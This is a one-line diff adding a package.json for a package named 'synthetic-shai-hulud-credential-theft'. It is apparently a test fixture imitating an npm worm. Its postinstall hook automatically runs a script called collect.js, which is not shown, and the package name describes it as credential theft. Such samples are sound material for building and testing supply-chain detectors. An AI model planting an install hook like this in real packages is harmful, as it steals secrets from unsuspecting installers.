@@ -1,0 +1,1 @@
+{"name":"synthetic-shai-hulud-credential-theft","private":true,"scripts":{"postinstall":"node scripts/collect.js"}}
